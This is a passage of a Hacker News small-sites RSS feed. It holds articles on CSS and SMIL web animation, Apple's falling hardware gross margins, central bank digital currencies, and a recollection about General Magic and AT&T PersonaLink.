<span>SMIL</span> give you the toolset to cre­ate Flash-like ani­ma­tions in the brows­er using an open stan­dard. But what are its short­com­ings with regard to animations?</p><ul><li>First­ly it’s a&nbsp;huge and com­plex spec­i­fi­ca­tion. It’s scope is much larg­er than just ani­ma­tions so get­ting start­ed is&nbsp;hard.</li><li>It’s obvi­ous­ly lim­it­ed to ani­mat­ing <em><span>SVG</span></em> ele­ments. You can’t use it to ani­mate oth­er ele­ments on a&nbsp;page.</li><li>Although <a href="https://caniuse.com/#feat=svg-smil"><span>SMIL</span> still has good sup­port</a>, there are <a href="https://groups.google.com/a/chromium.org/forum/#!msg/blink-dev/5o0yiO440LM/YGEJBsjUAwAJ">rum­blings of it being phased out in most browsers</a>.</li></ul><p>So while it’s still around in <span>2020</span>, it’s prob­a­bly best to look beyond <span>SMIL</span> for ani­mat­ing on the&nbsp;web.</p><p>The good news is that you can still ani­mate SVGs <em>with­out <span>SMIL</span></em> using the oth­er APIs and tech­nolo­gies that we’re going to dis­cuss&nbsp;below.</p><h2><span>CSS</span> Tran­si­tions, Ani­ma­tions <span>&amp;</span>&nbsp;Transforms<br></h2><p>As the web found its feet in the mid-<span>2000</span>s, one of the big leaps for­ward was the intro­duc­tion of both <span>HTML<span>5</span></span> and <span>CSS<span>3</span></span> (~<span>2005</span>). These remain the lat­est releas­es of the <span>HTML</span> and <span>CSS</span> stan­dards and they intro­duced a&nbsp;slew of new fea­tures that helped unite web tech­nolo­gies across browsers.</p><p>One of the most antic­i­pat­ed fea­tures was the joint-intro­duc­tion of <span>CSS</span> ani­ma­tions, tran­si­tions and trans­forms via the fol­low­ing properties:</p><ul><li><code>transform: ...</code></li><li><code>transition: ...</code></li><li><code>animate: ...</code> + <code>@key-frames</code></li></ul><p>These three addi­tions paved the way for native ani­ma­tions in the brows­er and are the go-to for most devel­op­ers these days that want to get start­ed with brows­er animations.</p><p>Because they were intro­duced at the same time, they are often assumed to <em>all</em> be required when ani­mat­ing but this is not the case. It’s vital to under­stand these as <span>3</span>&nbsp;dis­tinct (albeit relat­ed) features.</p><p>Let’s have a&nbsp;look at them in a&nbsp;bit more detail.</p><h3><span>CSS</span> Trans­forms</h3></section><section></section><section data-component="textBlock"><p>The <code>transform</code> prop­er­ty allows you change the appear­ance of an ele­ment. For exam­ple you&nbsp;can:</p><ul><li>Scale</li><li>Skew</li><li>Trans­late</li><li>Rotate</li></ul><p>Just like you would an image in Photoshop.</p><p>Here’s the impor­tant part: on its own, a&nbsp;<code>transform</code> has <u>absolute­ly noth­ing to do with ani­ma­tion</u>. Trans­forms <em>can</em> be ani­mat­ed but they have noth­ing to do with ani­ma­tion themselves.<br></p><h3><span>CSS</span> Tran­si­tions</h3></section><section></section><section data-component="textBlock"><p>The <code>transition</code> prop­er­ty is the baby-sib­ling in the <span>CSS</span> ani­ma­tion fam­i­ly, dis­tinct from its old­er sib­lings <code>animate</code> and <code>@key-frames</code>.</p><p>Let’s drop the metaphor and be clear: tran­si­tions and ani­ma­tions are sep­a­rate fea­tures to be used in dif­fer­ent circumstances.</p><p>Tran­si­tions allow you to define an ani­ma­tion that runs when a&nbsp;par­tic­u­lar prop­er­ty on an ele­ment changes, for example:<br></p></section><section><pre><code data-component="syntax-highlighter">.truck {
	transition: transform 1s ease-in;
}

.truck.drive {
	transform: translate3d(100%, 0, 0);
}
</code></pre></section><section data-component="textBlock"><p>Here, when we add the <code>.drive</code> class to our truck the brows­er applies a&nbsp;<code>transform</code> that moves the truck <span>100</span>% to the&nbsp;right.&nbsp;<br></p><ol><li>How is this tran­si­tion trig­gered? For the tran­si­tion to begin, our ele­ment needs to have the <code>.drive</code> class applied. We could use pseu­do-selec­tor like <code>:hover</code> in our tran­si­tions, but usu­al­ly these trig­gers are applied via JavaScript. Either way, <strong>tran­si­tions require a&nbsp;trig­ger to run</strong>.</li><li>What if we want this to run more than once (i.e. loop)? We can’t do this with tran­si­tions. <strong>Tran­si­tions only run once, in response to their trigger.</strong></li><li><strong></strong>What if we want inter­me­dia <span></span>​<span>“</span>stages” to our opac­i­ty tran­si­tion? For exam­ple, maybe fade-in to <code>.2</code> opac­i­ty, hold there, then fin­ish fad­ing-in to <code>1.0</code> opac­i­ty. We can’t con­trol that with tran­si­tions. <strong>Tran­si­tions only have two <span></span>​<span>“</span>states”.</strong></li></ol><p>The impli­ca­tion of this is that tran­si­tions are use­ful when you want to ani­mate some­thing that has a&nbsp;def­i­nite start and end-state and only needs to run once when triggered.</p><h3><span>CSS</span> Ani­ma­tions</h3></section><section></section><section data-component="textBlock"><p>The <code>animate</code> prop­er­ty and <code>@keyframes</code> at-rule address some of the ques­tions left unan­swered by tran­si­tions, but remem­ber that they are a&nbsp;dis­tinct fea­ture meant for dif­fer­ent things.</p><p>While tran­si­tions are good for one-off ani­ma­tions these are used for cre­at­ing mul­ti-stage ani­ma­tions that run more than&nbsp;once.</p><p>What does an ani­ma­tion look&nbsp;like?</p></section><section><pre><code data-component="syntax-highlighter">.wheels {
	animation-name: spin;
	animation-duration: .3s;
	animation-iteration-count: infinite;
	animation-timing-function: linear;
	animation-direction: normal;
}

@keyframes spin {
	from {
		transform: rotate(0deg);
	}
	to {
		transform: rotate(360deg);
	}
}
</code></pre></section><section data-component="textBlock"><ol><li>In con­trast to a&nbsp;tran­si­tion, this ani­ma­tion begins imme­di­ate­ly when the page loads. We <em>could</em> add the <code>animation</code> prop­er­ty to a&nbsp;trig­gered class or pseu­do-selec­tor, but we don’t have to. In oth­er words, <strong>ani­ma­tions can run with­out a&nbsp;trigger.</strong></li><li>The next thing to note is that our ani­ma­tion here can have &gt;<span>2</span> states. We can add as many states as we want in our <code>@keyframes</code> rule to give us real­ly fine-grained con­trol over how the ani­ma­tion pro­gress­es. <strong>Ani­ma­tions can have mul­ti­ple states</strong></li><li>We can also con­trol how many times this ani­ma­tion is run. In our exam­ple it will spin indef­i­nite­ly as we’ve indi­cat­ed <code>i…</code></li></ol></section></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://weareferal.com/blog/a-half-baked-history-of-web-animations/">https://weareferal.com/blog/a-half-baked-history-of-web-animations/</a></em></p>]]>
            </description>
            <link>https://weareferal.com/blog/a-half-baked-history-of-web-animations/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25200336</guid>
            <pubDate>Tue, 24 Nov 2020 17:01:47 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Apple’s Missing Profits]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25200251">thread link</a>) | @simonpure
<br/>
November 24, 2020 | https://digitstodollars.com/2020/11/20/apples-missing-profits-the-usual-suspects/ | <a href="https://web.archive.org/web/*/https://digitstodollars.com/2020/11/20/apples-missing-profits-the-usual-suspects/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		
<p>Yesterday <a href="https://digitstodollars.com/2020/11/19/the-mystery-of-apples-missing-profits/">we teased the problem of Apple’s steadily declining hardware gross margins</a>. Today we want to walk through some of the possible reasons for the decline. </p>



<figure><table><tbody><tr><td></td><td><strong>2013</strong></td><td><strong>2014</strong></td><td><strong>2015</strong></td><td><strong>2016</strong></td><td><strong>2017</strong></td><td><strong>2018</strong></td><td><strong>2019</strong></td><td><strong>2020</strong></td></tr><tr><td>GM</td><td>37.6%</td><td>38.6%</td><td>40.1%</td><td>39.1%</td><td>38.5%</td><td>38.3%</td><td>37.8%</td><td>38.2%</td></tr><tr><td>OM</td><td>28.7%</td><td>28.7%</td><td>30.5%</td><td>27.8%</td><td>26.8%</td><td>26.7%</td><td>24.6%</td><td>24.1%</td></tr><tr><td>GM<br>(ex-srvcs)</td><td>﻿</td><td>﻿</td><td>﻿</td><td>﻿</td><td>35.2%</td><td>34.4%</td><td>32.2%</td><td>31.5%</td></tr><tr><td>Srvcs GM</td><td></td><td></td><td></td><td></td><td>60.0%</td><td>60.8%</td><td>63.7%</td><td>66.0%</td></tr></tbody></table></figure>



<p>The first thing to note is that gross margins peaked in 2015 and have been trending down ever since.</p>



<p>A few people asked us if their services business was the culprit. Apple began a serious push into music, video and content around that time. Several people pointed out that Netflix, Spotify, XM and other content companies all had to sustain weak gross margins early in their life. The problem with this theory is that Apple’s services gross margins are both higher than corporate average and have been growing while the hardware margins are declining. </p>



<p>Services include more than the content business. The segment also contains Cloud Services, Apple Care and Advertising. As far as we know Apple’s ad business is too small to move the needle much, but we imagine it is fairly profitable. Apple Care is an extended warranty business, insurance basically, and common wisdom will tell you as a consumer to never buy the extended warranty, because it is always priced for the seller to make (a lot of) money. Cloud Services is largely about selling cloud-based storage for what we, as customers of this particular service, find to be an exorbinant price. Apple storage costs $9.99/month for 2TB of storage. Apple probably made enough on these to cover the initial start-up costs of the content business, and now content is profitable in its own right, as borne out by the numbers.</p>



<p>The next most obvious cause would be an increase in component costs. But this seems unlikely. True, during this period Apple was upgrading the screens and RF components and much of its Mac line. This may have had an impact, but given Apple’s past operations practice it is hard to see this alone being the big driver in costs. If the screen really cost that much more we imagine Apple could have held off upgrading for a period, smoothing out the hit. Similarly, the increase in RF content has been taking place for almost ten years, since Apple started adding 4G. There is nothing that leads us to believe Apple has conceded much on any component pricing. </p>



<p>So the next place we would look is product mix. The chart below shows revenue growth by product category, with 2013 as the base year. During this period, Services and Wearables really took off. However, we already know services was not the culprit. That leaves Wearables, and here we may have found our first clue. </p>



<figure><a href="https://digitstodollars.files.wordpress.com/2020/11/image-1.png"><img data-attachment-id="3860" data-permalink="https://digitstodollars.com/image-1-2/" data-orig-file="https://digitstodollars.files.wordpress.com/2020/11/image-1.png" data-orig-size="686,416" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="image-1" data-image-description="" data-medium-file="https://digitstodollars.files.wordpress.com/2020/11/image-1.png?w=300" data-large-file="https://digitstodollars.files.wordpress.com/2020/11/image-1.png?w=470" src="https://digitstodollars.files.wordpress.com/2020/11/image-1.png?w=686" alt="" srcset="https://digitstodollars.files.wordpress.com/2020/11/image-1.png 686w, https://digitstodollars.files.wordpress.com/2020/11/image-1.png?w=150 150w, https://digitstodollars.files.wordpress.com/2020/11/image-1.png?w=300 300w" sizes="(max-width: 686px) 100vw, 686px"></a></figure>



<p>Apple launched Apple Watch in 2015 and Airpods in late 2016 (in Apple’s 2017 Fiscal Year). When Airpods first came out, it was hard to buy them, with multi-month wait times. At the time, many ascribed the delay to the popularity of the devices, and they were very popular. However, a more likely reason for the delay was that Apple was having a hard time manufacturing them. Something about production, maybe the perfectly rounded case or maybe the miniaturization of circuitry in the earbuds, was driving up defect rates. Another way to spell manufacturing problems is increased cost of goods sold. If 10% or 20% of devices are defective, that can often be enough to wreck the profitability of a device, and our guess is that Apple’s initial manufacturing rates were worse than that. Apple Watch seems to have less problems in manufacturing, but we suspect these also had poor gross margins to start out. </p>



<p>We believe these devices are now manufacturing at good yields. But there is the possibility that the margins on these products are poorer than the average iPhone or Mac. And as they have grown strongly, it is possible that they are weighing down margins. And this leads to our next suspect – mix shift.</p>



<p>Mix shift refers to the blended gross margin. If you are selling high margin products and then start selling lower margin devices, the average price of your devices falls . No discounts or price reductions involved, but prices, and thus gross margins, fall when everything is averaged out. As noted above, part of this is the growth of possibly lower-margin Wearables. But there is more to the story.</p>



<p>The graph below shows revenue growth by geography, again the base year is 2013. The standout feature of this chart is China. A combination of Trade War patriotism and resurgent strength among Chinese brands drove a reduction in Apple’s growth in China. This is important as we believe Apple’s iPhone sales in China skew heavily towards higher priced devices. So declines in China also likely brought down blended gross margins. </p>



<figure><a href="https://digitstodollars.files.wordpress.com/2020/11/image-2.png"><img data-attachment-id="3863" data-permalink="https://digitstodollars.com/image-2-2/" data-orig-file="https://digitstodollars.files.wordpress.com/2020/11/image-2.png" data-orig-size="660,408" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="image-2" data-image-description="" data-medium-file="https://digitstodollars.files.wordpress.com/2020/11/image-2.png?w=300" data-large-file="https://digitstodollars.files.wordpress.com/2020/11/image-2.png?w=470" src="https://digitstodollars.files.wordpress.com/2020/11/image-2.png?w=660" alt="" srcset="https://digitstodollars.files.wordpress.com/2020/11/image-2.png 660w, https://digitstodollars.files.wordpress.com/2020/11/image-2.png?w=150 150w, https://digitstodollars.files.wordpress.com/2020/11/image-2.png?w=300 300w" sizes="(max-width: 660px) 100vw, 660px"></a></figure>



<p>This is borne out further by Operating Margins, as shown in the graph below. We had to double check the data on this one because it so closely mirrors the graph above. Just as Apple’s China sales slowed, so did their operating margins in the region. Given that there was no obvious change in regional operating expenses during this period, the most likely explanation for a fall of this magnitude is that decline in sales and gross margins.</p>



<figure><a href="https://digitstodollars.files.wordpress.com/2020/11/image-3.png"><img data-attachment-id="3866" data-permalink="https://digitstodollars.com/image-3-2/" data-orig-file="https://digitstodollars.files.wordpress.com/2020/11/image-3.png" data-orig-size="676,416" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="image-3" data-image-description="" data-medium-file="https://digitstodollars.files.wordpress.com/2020/11/image-3.png?w=300" data-large-file="https://digitstodollars.files.wordpress.com/2020/11/image-3.png?w=470" src="https://digitstodollars.files.wordpress.com/2020/11/image-3.png?w=676" alt="" srcset="https://digitstodollars.files.wordpress.com/2020/11/image-3.png 676w, https://digitstodollars.files.wordpress.com/2020/11/image-3.png?w=150 150w, https://digitstodollars.files.wordpress.com/2020/11/image-3.png?w=300 300w" sizes="(max-width: 676px) 100vw, 676px"></a></figure>



<p>One other important thing happened in 2016 – Apple began selling the iPhone SE in that year. The SE was the company’s first foray into sub $400 devices. Apple does not break out unit sales anymore, let alone sales by model, but the launch of this device seems very likely to have affected the company’s gross margins. However, the situation is not quite as straightforward as that. At the time, Apple noted that the new models actually boosted gross margins. We believe the SE was designed with this in mind. That being said, while the SE alone probably did not cause the decline in margins, but we believe it did signal a new approach from Apple towards pricing and market segmentation. Just as Apple began launching &gt;$1,000 phones, they also opened up the flood gates to lower priced devices, growing their addressable market. </p>



<p>There were suspicions about this at the time, and not long after Apple stopped disclosing unit numbers. When they did that <a href="https://digitstodollars.com/2018/12/18/non-disclosure-apple/">we had the strong suspicion</a> that they were trying to mask something unpleasant. And it now seems likely that Apple was moving towards a lower-weighted price band, and unit numbers would have made that glaring. </p>



<p>So after all that, our best guess is that mix shift is the leading cause of Apple’s gross margin decline, with some element of a shift to more expensive components and casing a contributing factor.</p>



<p>In our next piece we will review what Apple can do to address this. </p>



<p><em>Photo by&nbsp;<a href="https://unsplash.com/@sixstreetunder?utm_source=unsplash&amp;utm_medium=referral&amp;utm_content=creditCopyText">Craig Whitehead</a>&nbsp;on&nbsp;<a href="https://unsplash.com/s/photos/detective?utm_source=unsplash&amp;utm_medium=referral&amp;utm_content=creditCopyText">Unsplash</a></em></p>
			</div></div>]]>
            </description>
            <link>https://digitstodollars.com/2020/11/20/apples-missing-profits-the-usual-suspects/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25200251</guid>
            <pubDate>Tue, 24 Nov 2020 16:55:22 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Bitcoin 2021 Probabilistic Forecast]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25200220">thread link</a>) | @refrigerator
<br/>
November 24, 2020 | https://my.causal.app/models/21522 | <a href="https://web.archive.org/web/*/https://my.causal.app/models/21522">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://my.causal.app/models/21522</link>
            <guid isPermaLink="false">hacker-news-small-sites-25200220</guid>
            <pubDate>Tue, 24 Nov 2020 16:52:32 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Is the internet of money America's to lose?]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25200011">thread link</a>) | @venturegrit
<br/>
November 24, 2020 | https://andyjagoe.com/the-internet-of-money/ | <a href="https://web.archive.org/web/*/https://andyjagoe.com/the-internet-of-money/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
                <div>
                    <p>The Berkshires is a popular countryside getaway in western Massachusetts, a few hours drive from New York or Boston. If you visit, you'll notice charming villages, verdant farms, and people using a currency other than US dollars. Berkshire County has its own local currency called the <a href="http://www.berkshares.org/">BerkShare</a>.</p><figure><img src="https://andyjagoe.com/content/images/2020/11/image-3.png" alt="" srcset="https://andyjagoe.com/content/images/size/w600/2020/11/image-3.png 600w, https://andyjagoe.com/content/images/2020/11/image-3.png 750w" sizes="(min-width: 720px) 720px"></figure><p>BerkShares are available at <a href="http://www.berkshares.org/berkshares_banks">local bank branches</a> in exchange for US dollars at a rate of 95 cents per BerkShare. BerkShares can be spent at a rate of $1 to 1 BerkShare, effectively giving you a 5% discount for spending locally.</p><p>History is <a href="https://base.socioeco.org/docs/pictorial_history_of_ccs.pdf">full of local currencies</a> and <a href="https://en.wikipedia.org/wiki/Local_currency#List_of_local_currencies">hundreds are in use</a> around the world. But most don't last for long. One of the most successful local currencies, the <a href="https://en.wikipedia.org/wiki/Bristol_Pound">Bristol Pound</a>, has been suspended and is converting all accounts to pound sterling.</p><p>New currencies are not as unusual as you might think. Currencies come and go all the time. Over the past few years we've seen many new digital currencies emerge. Like Bitcoin.</p><p>What's new is that central banks are entering the fray. The Bank for International Settlements (BIS) estimates that 80% of central banks are now <a href="https://www.bis.org/publ/bppdf/bispap107.pdf">looking into central bank digital currencies</a>. China has an active pilot and claims to have completed <a href="https://www.reuters.com/article/china-currency-digital/spending-with-chinas-digital-yuan-around-300-million-pboc-says-idUSL1N2HO0B1">4 million transactions</a>, with a <a href="https://www.wsj.com/articles/china-to-expand-testing-of-a-digital-currency-11597385324">full roll-out planned</a> for the 2022 Beijing Winter Olympics. <a href="https://www.theblockcrypto.com/post/75022/a-global-look-at-central-bank-digital-currencies-full-research-report">Other countries have also completed pilots</a>.</p><p>Why is this happening? </p><p>Because <a href="https://andyjagoe.com/software-eats-money/">money is becoming software</a>. And the internet of money is emerging. </p><p>What is the internet of money? </p><p>It's the reimagining of money and the global financial system. It's doing for money what the Internet did for information. Like making payments as easy as sending email.</p><p>Central banks realize this, and it's making them nervous. What will the internet of money look like? How will it work? Nobody knows. But it's sure to be one of the most consequential developments of our lifetimes.</p><p>Let's start our exploration of the internet of money in an obvious place: central bank digital currencies. What exactly are they? What problems could they solve? What problems might they create? And should we be worried about China's?</p><p>One of the best and simplest definitions of <a href="https://www.bankofengland.co.uk/-/media/boe/files/paper/2020/central-bank-digital-currency-opportunities-challenges-and-design.pdf">central bank digital currency</a> comes from the Bank of England:</p><!--kg-card-begin: markdown--><blockquote>
<p>A Central Bank Digital Currency (CBDC) would be an electronic form of central bank money that could be used by households and businesses to make payments. The key differentiation between reserves (which have been electronic and central bank issued for decades) is that they are universally accepted to all households. And unlike banknotes, would be fully digital.</p>
</blockquote>
<!--kg-card-end: markdown--><p>Importantly, a central bank digital currency could enable direct peer-to-peer payments outside of today's banking and payment systems, and is money backed by the central bank (like cash) and held outside of commercial banks.</p><p>To help you understand how central bank digital currencies fit into the general monetary landscape, here's a "money flower" diagram based on <a href="https://www.bis.org/publ/qtrpdf/r_qt1709f.htm">the one created by the Bank for International Settlements</a>:</p><figure><img src="https://andyjagoe.com/content/images/2020/11/image-6.png" alt="" srcset="https://andyjagoe.com/content/images/size/w600/2020/11/image-6.png 600w, https://andyjagoe.com/content/images/size/w1000/2020/11/image-6.png 1000w, https://andyjagoe.com/content/images/2020/11/image-6.png 1392w" sizes="(min-width: 720px) 720px"><figcaption>The "Money Flower"</figcaption></figure><!--kg-card-begin: markdown--><p>The "money flower" categorizes money according to four properties:</p>
<ul>
<li>Is the money <em><strong>universally accepted</strong></em> or not? Note the diagram misses that this is a sliding scale and not zero or one. No money is acceptable everywhere.</li>
<li>Does the money exist in <em><strong>electronic</strong></em> form?</li>
<li>Is the money backed by the full faith and credit of the <em><strong>central bank</strong></em>? Cash and central bank digital currencies are, but bank deposits are not. That's why they need deposit insurance.</li>
<li>Does the money exist in bearer form (whether physical or digital) such that it can be exchanged <em><strong>peer-to-peer</strong></em> with no intermediary?</li>
</ul>
<!--kg-card-end: markdown--><p>With this understanding, let's look at the benefits central bank digital currencies might deliver.</p><h2 id="benefits-of-central-bank-digital-currency">Benefits of central bank digital currency</h2><p>An increasing amount of work exploring central bank digital currencies is being done by the <a href="https://blogs.imf.org/2019/12/12/central-bank-digital-currencies-4-questions-and-answers/">International Monetary Fund (IMF)</a>, the <a href="https://www.bis.org/cpmi/publ/d174.pdf">Bank of International Settlements (BIS)</a> and <a href="https://en.wikipedia.org/wiki/Central_bank_digital_currency">many others</a>. Key benefits include:</p><p><strong>Improved financial system stability</strong>: Some central banks are concerned about the concentration of payment systems among a few very large companies (some of which are foreign). Also, allowing settlement directly in central bank digital currency instead of bank deposits reduces the concentration of liquidity and credit risk in payment systems. This reduces the systemic importance of large banks.</p><p><strong>Payments competitiveness</strong>: A central bank digital currency provides competition for large companies involved in payments, reducing the potential rents they can charge. It could also open the payments landscape to smaller players and reduce the need for small banks and non-banks to run their payments through large banks, which charge them high fees.</p><p><strong>New monetary policy tools</strong>: A central bank digital currency enables much better data analytics on payment flows and could enable the central bank to deliver targeted "helicopter money" directly to people who need it as opposed to waiting for it to trickle down via the banking sector. An interest bearing central bank digital currency could also enable the central bank to force negative interest rates. That said, holding money that's explicitly reduced every month might not be that popular, and "helicopter money" could just as easily be delivered via <a href="https://www.coindesk.com/watch-us-lawmakers-will-talk-digital-dollar-fedaccounts-in-thursday-hearing">FedAccounts</a>—no central bank digital currency required.</p><p><strong>Financial inclusion</strong>: Central bank digital currencies would be designed primarily for payments, whereas banks are primarily lenders. This is one reason bank's have such poor deposit and payment products. <a href="https://andyjagoe.com/how-to-beat-the-bank/">There's no incentive to improve them</a>. Many central banks want to ensure a safe public money option is available in a world where use of cash is rapidly declining. However, the issue with the unbanked may be more complicated than it seems at face value. In the US, <a href="http://jpkoning.blogspot.com/2020/11/why-are-so-many-americans-content-to-be.html">most of the 5.4% of people who don't have bank accounts don't want them</a> because they don't trust banks. JP Koning discusses some creative ways this might be addressed via <a href="http://jpkoning.blogspot.com/2020/11/why-are-so-many-americans-content-to-be.html">USPS accounts or even Walmart accounts</a>. Could the same apply in other regions too? Could financial inclusion be addressed without a central bank digital currency?</p><p><strong>Currency competitiveness</strong>: A central bank digital currency could expand global usage of a local currency and reduce the dependency on the dollar by improving payment capabilities. This could also help work toward <a href="https://en.wikipedia.org/wiki/Reserve_currency">reserve</a> status.</p><p><strong>Reduce the cost of cash</strong>: Supporting a national means of payment using cash has become very expensive in some countries, especially when they span large geographic areas or many small islands. A central bank digital currency could be a cheaper alternative.</p><p>Are central bank digital currencies the way the internet of money is likely to be built?</p><h2 id="problems-with-central-bank-digital-currency">Problems with central bank digital currency</h2><p>In theory, there are many good reasons to consider a central bank digital currency. But this is only in theory. In reality, the digital money landscape is moving very fast and the issues and challenges with a central bank digital currency are enormous.</p><p>First, there is the privacy issue. Unlike with cash, every single transaction could be recorded and monitored by the government. You might say people willingly trade away privacy for convenience today to use Facebook and Google. This is true. But the downstream impact of not using Facebook or Google is limited. And you can turn tracking off. But what if you couldn't buy or sell something because the government had decided to censor you or the other party? What if it was a mistake?</p><p>Second, central bank digital currency would be cancellable and could be remotely seized with the push of a button. Where would the checks and balances be on the safety of your money? Commercial banks at least have a financial incentive to protect their client's money and demand a court order to freeze an account. What incentives does the central bank have to protect <em>your</em> money? If there's a mistake, what's your recourse? Standing in line at a government office?</p><p>Third, a strong foreign central bank digital currency might make it harder for some countries to run independent monetary policies and control domestic financial conditions. And foreigners using local central bank digital currencies might similarly increase capital flow volatility and complicate domestic monetary policies.</p><p>Fourth, a central bank digital currency could disintermediate the banking sector and increase the possibility of bank runs. If individuals prefer holding central bank digital currency over bank deposits in any significant volume, banks will be forced to raise expensive wholesale money or increase interest paid on accounts. This will force banks to accept lower margins or charge higher interest rates on loans.</p><p>Finally—and most importantly—central banks are experts in money, not software. To understand how important this is, let's look at what's happening now at the intersection of software, networks and money.</p><h2 id="the-public-blockchain-is-dollarizing">The public blockchain is dollarizing</h2><p>One of the most significant recent developments is that the public blockchains are dollarizing. Cryptocurrencies pegged to the dollar (called <a href="https://academy.binance.com/en/articles/what-are-stablecoins">stablecoins</a>) now account for 40% of the daily public blockchain transaction volume, up from almost zero two years ago.</p><figure><img src="https://andyjagoe.com/content/images/2020/11/image-7.png" alt="" srcset="https://andyjagoe.com/content/images/size/w600/2020/11/image-7.png 600w, https://andyjagoe.com/content/images/size/w1000/2020/11/image-7.png 1000w, https://andyjagoe.com/content/images/size/w1600/2020/11/image-7.png 1600w, https://andyjagoe.com/content/images/2020/11/image-7.png 1808w" sizes="(min-width: 720px) 720px"></figure><p>In addition, the dollar denominated cryptocurrency monetary base is exploding, growing at over 300% this year. While only 7.5% of the monetary base of Bitcoin, crypto dollars are growing 50% faster.</p><figure><img src="https://andyjagoe.com/content/images/2020/11/image-8.png" alt="" srcset="https://andyjagoe.com/content/images/size/w600/2020/11/image-8.png 600w, https://andyjagoe.com/content/images/size/w1000/2020/11/image-8.png 1000w, https://andyjagoe.com/content/images/2020/11/image-8.png 1552w" sizes="(min-width: 720px) 720px"></figure><p>Public blockchains dollarizing may be a pivotal development in how the internet of money will ultimately work. Why is it happening? And why so fast?</p><p>In short, a <a href="https://unexpected-values.com/crypto-dollars/">massive global supply-demand imbalance in the dollar market</a>. </p><p>First, the world's debt today is largely denominated in US dollars, now reaching almost $60 trillion. Debtors require dollars to service this debt, and <a href="https://www.reuters.com/article/us-global-markets-debt/new-high-water-mark-for-global-foreign-currency-debt-idUSKBN1X921E">dollar debt is now 4x euro debt and 20x yen debt</a>.</p><figure><img src="https://andyjagoe.com/content/images/2020/11/image-9.png" alt=""><figcaption>Source: <a href="https://www.bis.org/statistics/gli1907.pdf">https://www.bis.org/statistics/gli1907.pdf</a></figcaption></figure><p>Second, while the fed funds rate is low, most developed country's rates are even lower. This drives demand for US debt, which again increases future demand for dollars to service this …</p></div></section></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://andyjagoe.com/the-internet-of-money/">https://andyjagoe.com/the-internet-of-money/</a></em></p>]]>
            </description>
            <link>https://andyjagoe.com/the-internet-of-money/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25200011</guid>
            <pubDate>Tue, 24 Nov 2020 16:36:37 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[In 1994 when Steve Jobs got to use a device like an iPhone (2018)]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25199999">thread link</a>) | @GoRudy
<br/>
November 24, 2020 | https://www.cake.co/conversations/6bNY8PD/that-time-in-1994-when-steve-jobs-got-to-use-a-device-like-an-iphone/ | <a href="https://web.archive.org/web/*/https://www.cake.co/conversations/6bNY8PD/that-time-in-1994-when-steve-jobs-got-to-use-a-device-like-an-iphone/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody"><div><p>Chris: There were probably some hard feelings a couple of decades ago but none lingering, not even those that may have been there wouldn't have been squarely aimed at you. </p><p>Since you were in charge of dealing with 3'd party developers I think I always realized you had a hand in the onboarding of AOL, though until I read your post I always assumed the idea originated with Sony. In the end it didn't really matter - the presence of AOL on SONY MagicLink's did not generate device sales any more than our name did, and ultimately AT&amp;T PersonaLink was utterly dependent on device sales and unlike AOL, spent a fair amount of money to actually attempt to actually generate device sales. As you'll see in point 2 below we saw an urgent need to diversify into a PC application about a year before the MagicLink launched, but as we both know that idea died a slow, agonizing death.</p><p>There are two somewhat related points that I don't recall if we discussed or not which could have possibly (though not probably) reversed the fortunes of at least our part of the General Magic universe.</p><p>1. AT&amp;T spent all that money developing what we would today call a cloud based platform for "communicating applications using General Magic's Telescript technology." Our deal with General Magic obligated us to be the first to develop any application that had anything to do with Telescript, and that was the GM/PersonaLink messaging application. If all General Magic wanted was a then current state of the art e-mail network, we could have made that available a week after our initial meeting with Marc Porat, Rich Miller and Bill Atkinson when they first visited us at a Bell Labs facility in NJ. No, it had to have Telescript.</p><p>To my recollection no 3'd party apps were ever developed using Telescript, including AOL's. In truth there wasn't much Telescript in the PersonaLink Mail application - 